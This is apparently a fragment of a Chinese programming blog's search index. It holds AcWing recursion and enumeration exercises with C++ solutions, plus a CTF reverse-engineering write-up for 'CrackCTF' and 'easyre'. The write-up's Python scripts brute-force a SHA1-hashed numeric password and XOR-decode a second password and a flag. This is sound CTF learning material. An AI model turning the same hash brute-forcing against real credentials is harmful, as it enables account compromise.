class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">16</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> st[N];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(u&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(st[i]==<span class="hljs-number">1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, i);<br>        &#125;<br>        <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    st[u]=<span class="hljs-number">2</span>;<br>    dfs(u+<span class="hljs-number">1</span>);<br>    st[u]=<span class="hljs-number">0</span>;<span class="hljs-comment">//分支1不选</span><br>    <br>    st[u]=<span class="hljs-number">1</span>;<br>    dfs(u+<span class="hljs-number">1</span>);<br>    st[u]=<span class="hljs-number">0</span>;<span class="hljs-comment">//分支2选</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;n;<br>    dfs(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Acw-94-递归实现排列型枚举"><a href="#Acw-94-递归实现排列型枚举" class="headerlink" title="Acw 94.递归实现排列型枚举"></a>Acw 94.递归实现排列型枚举</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>把 1∼n1∼n 这 nn 个整数排成一行后随机打乱顺序，输出所有可能的次序。</p><h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>一个整数 nn。</p><h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>按照从小到大的顺序输出所有方案，每行 11 个。</p><p>首先，同一行相邻两个数用一个空格隔开。</p><p>其次，对于两个不同的行，对应下标的数一一比较，字典序较小的排在前面。</p><h4 id="数据范围-1"><a href="#数据范围-1" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n≤91≤n≤9</p><h4 id="输入样例：-1"><a href="#输入样例：-1" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3<br></code></pre></td></tr></table></figure><h4 id="输出样例：-1"><a href="#输出样例：-1" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">10</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> state[N];<br><span class="hljs-type">bool</span> used[N];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(u&gt;n)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, state[i]);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!used[i])<br>        &#123;<br>            state[u]=i;<br>            used[i]=<span class="hljs-literal">true</span>;<br>            dfs(u+<span class="hljs-number">1</span>);<br>            <br>            state[u]=<span class="hljs-number">0</span>;<br>            used[i]=<span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;n;<br>    dfs(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Acw-93-递归实现组合型枚举"><a href="#Acw-93-递归实现组合型枚举" class="headerlink" title="Acw 93.递归实现组合型枚举"></a>Acw 93.递归实现组合型枚举</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>从 1∼n1∼n 这 nn 个整数中随机选出 mm 个，输出所有可能的选择方案。</p><h4 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式"></a>输入格式</h4><p>两个整数 n,mn,m ,在同一行用空格隔开。</p><h4 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式"></a>输出格式</h4><p>按照从小到大的顺序输出所有方案，每行 11 个。</p><p>首先，同一行内的数升序排列，相邻两个数用一个空格隔开。</p><p>其次，对于两个不同的行，对应下标的数一一比较，字典序较小的排在前面（例如 <code>1 3 5 7</code> 排在 <code>1 3 6 8</code> 前面）。</p><h4 id="数据范围-2"><a href="#数据范围-2" class="headerlink" title="数据范围"></a>数据范围</h4><p>n&gt;0n&gt;0 ,<br>0≤m≤n0≤m≤n ,<br>n+(n−m)≤25n+(n−m)≤25</p><h4 id="输入样例：-2"><a href="#输入样例：-2" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-2"><a href="#输出样例：-2" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">5</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span> <br><span class="hljs-symbol">1 </span><span class="hljs-number">4</span> <span class="hljs-number">5</span> <br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">4</span> <br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">5</span> <br><span class="hljs-symbol">2 </span><span class="hljs-number">4</span> <span class="hljs-number">5</span> <br><span class="hljs-symbol">3 </span><span class="hljs-number">4</span> <span class="hljs-number">5</span> <br></code></pre></td></tr></table></figure><p><strong>思考题</strong>：如果要求使用非递归方法，该怎么做呢？</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用递归建立起数结构，每次都对是否选中下一个树做成选择，构成二叉树</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">30</span>;<br><br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> way[N];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> start)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(u+n-start&lt;m) <span class="hljs-keyword">return</span>; <span class="hljs-comment">//剪枝</span><br>    <span class="hljs-keyword">if</span>(u==m+<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)   <span class="hljs-built_in">cout</span>&lt;&lt;way[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=start;i&lt;=n;i++)<br>    &#123;<br>        way[u]=i;<br>        dfs(u+<span class="hljs-number">1</span>, i+<span class="hljs-number">1</span>);<br>        way[u]=<span class="hljs-number">0</span>;<span class="hljs-comment">//恢复</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br>    dfs(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Acw-95-费解的开关"><a href="#Acw-95-费解的开关" class="headerlink" title="Acw 95.费解的开关"></a>Acw 95.费解的开关</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p>你玩过“拉灯”游戏吗？</p><p>2525 盏灯排成一个 5×55×5 的方形。</p><p>每一个灯都有一个开关，游戏者可以改变它的状态。</p><p>每一步，游戏者可以改变某一个灯的状态。</p><p>游戏者改变一个灯的状态会产生连锁反应：和这个灯上下左右相邻的灯也要相应地改变其状态。</p><p>我们用数字 11 表示一盏开着的灯，用数字 00 表示关着的灯。</p><p>下面这种状态</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">10111<br>01101<br>10111<br>10000<br>11011<br></code></pre></td></tr></table></figure><p>在改变了最左上角的灯的状态后将变成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">01111<br>11101<br>10111<br>10000<br>11011<br></code></pre></td></tr></table></figure><p>再改变它正中间的灯后状态将变成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">01111<br>11001<br>11001<br>10100<br>11011<br></code></pre></td></tr></table></figure><p>给定一些游戏的初始状态，编写程序判断游戏者是否可能在 66 步以内使所有的灯都变亮。</p><h4 id="输入格式-3"><a href="#输入格式-3" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行输入正整数 nn，代表数据中共有 nn 个待解决的游戏初始状态。</p><p>以下若干行数据分为 nn 组，每组数据有 55 行，每行 55 个字符。</p><p>每组数据描述了一个游戏的初始状态。</p><p>各组数据间用一个空行分隔。</p><h4 id="输出格式-3"><a href="#输出格式-3" class="headerlink" title="输出格式"></a>输出格式</h4><p>一共输出 nn 行数据，每行有一个小于等于 66 的整数，它表示对于输入数据中对应的游戏状态最少需要几步才能使所有灯变亮。</p><p>对于某一个游戏初始状态，若 66 步以内无法使所有灯变亮，则输出 −1−1。</p><h4 id="数据范围-3"><a href="#数据范围-3" class="headerlink" title="数据范围"></a>数据范围</h4><p>0&lt;n≤5000&lt;n≤500</p><h4 id="输入样例：-3"><a href="#输入样例：-3" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs">3<br>00111<br>01011<br>10001<br>11010<br>11100<br><br>11101<br>11101<br>11110<br>11111<br>11111<br><br>01111<br>11111<br>11111<br>11111<br>11111<br></code></pre></td></tr></table></figure><p>输出样例：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs diff">3<br>2<br><span class="hljs-deletion">-1</span><br></code></pre></td></tr></table></figure><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">6</span>;<br><br><span class="hljs-type">char</span> g[N][N], backup[N][N];<br><span class="hljs-type">int</span> dx[<span class="hljs-number">5</span>]=&#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;, dy[<span class="hljs-number">5</span>]=&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">turn</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a=x+dx[i], b=y+dy[i];<br>        <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">0</span> || a&gt;=<span class="hljs-number">5</span> || b&lt;<span class="hljs-number">0</span> || b&gt;=<span class="hljs-number">5</span>)    <span class="hljs-keyword">continue</span>;<br>        g[a][b]^=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> T;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;T;<br>    <span class="hljs-keyword">while</span>(T--)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>            <span class="hljs-built_in">cin</span>&gt;&gt;g[i];<br>        <span class="hljs-type">int</span> res=<span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> op=<span class="hljs-number">0</span>;op&lt;<span class="hljs-number">32</span>;op++)<br>        &#123;<br>            <span class="hljs-built_in">memcpy</span>(backup, g, <span class="hljs-keyword">sizeof</span>(g));<br>            <span class="hljs-type">int</span> step=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(op&gt;&gt;i &amp; <span class="hljs-number">1</span>)<br>                &#123;<br>                    step++;<br>                    turn(<span class="hljs-number">0</span>, i);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">5</span>;j++)<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(g[i][j]==<span class="hljs-string">&#x27;0&#x27;</span>)<br>                    &#123;<br>                        step++;<br>                        turn(i+<span class="hljs-number">1</span>, j);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-type">bool</span> dark=<span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(g[<span class="hljs-number">4</span>][i]==<span class="hljs-string">&#x27;0&#x27;</span>)<br>                &#123;<br>                    dark=<span class="hljs-literal">true</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!dark)   res=min(res, step);<br>            <span class="hljs-built_in">memcpy</span>(g, backup, <span class="hljs-keyword">sizeof</span>(g));<br>        &#125;<br>        <span class="hljs-keyword">if</span>(res&gt;<span class="hljs-number">6</span>)   res=<span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">cout</span>&lt;&lt;res&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 蓝桥杯 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu-re-CrackCTF &amp; easyre</title>
      <link href="/2021/03/8e9094ce.html"/>
      <url>/2021/03/8e9094ce.html</url>
      
        <content type="html"><![CDATA[<h2 id="CrackCTF"><a href="#CrackCTF" class="headerlink" title="CrackCTF"></a>CrackCTF</h2><p>总共有两个加密过程，第一个过程是调用了Windows的sha1加密，第二个过程是调用了类MD5加密，大致就是把AAA文件复制到了IPBuffer中，然后调用sub_401005函数，对lpString 和 lpBuffer进行异或操作，输入的是6个字符，因此异或的也应该是6个字节，在这里记录一下异或的具体py代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>passwd1=<span class="hljs-string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span><br>passwd2=<span class="hljs-string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span><br>suffix=<span class="hljs-string">&quot;@DBApp&quot;</span><br>aaa=[<span class="hljs-number">0x5</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x1</span>]<br>rtf_h=[<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x31</span>]<br><br>pass1=<span class="hljs-string">&quot;&quot;</span><br>pass2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>, <span class="hljs-number">1000000</span>):<br>    instr=<span class="hljs-built_in">str</span>(i)+suffix<br>    res=hashlib.sha1(instr.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-keyword">if</span> res==passwd1:<br>        pass1=<span class="hljs-built_in">str</span>(i)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;passwd1 = &quot;</span>, pass1)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    res=aaa[i]^rtf_h[i]<br>    pass2+=<span class="hljs-built_in">chr</span>(res)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;passwd2 = &quot;</span>, pass2)<br></code></pre></td></tr></table></figure><h2 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h2><p>观察for循环就行，从for循环了解到flag长度应该是11，将flag的ASCII值作为下标取值，与v4数组比较。很简单，只需要利用v4数组在_data_start_中找位置，就是我们flag的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">v4=[<span class="hljs-number">42</span>, <span class="hljs-number">70</span>, <span class="hljs-number">39</span>, <span class="hljs-number">34</span>, <span class="hljs-number">78</span>, <span class="hljs-number">44</span>, <span class="hljs-number">34</span>, <span class="hljs-number">40</span>, <span class="hljs-number">73</span>, <span class="hljs-number">63</span>, <span class="hljs-number">43</span>, <span class="hljs-number">64</span>]<br><br><span class="hljs-built_in">str</span>=<span class="hljs-string">r&quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot;</span> + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x27</span>) + <span class="hljs-string">r&#x27;&amp;%$# !&quot;&#x27;</span><br><br>pos=[]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v4:<br>    pos.append(<span class="hljs-built_in">str</span>.find(<span class="hljs-built_in">chr</span>(i))+<span class="hljs-number">1</span>)<br>s=[<span class="hljs-built_in">chr</span>(x+<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> pos]<br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(s)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+flag+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE-OD学习-动调初步</title>
      <link href="/2021/03/bb8a7f89.html"/>
      <url>/2021/03/bb8a7f89.html</url>
      
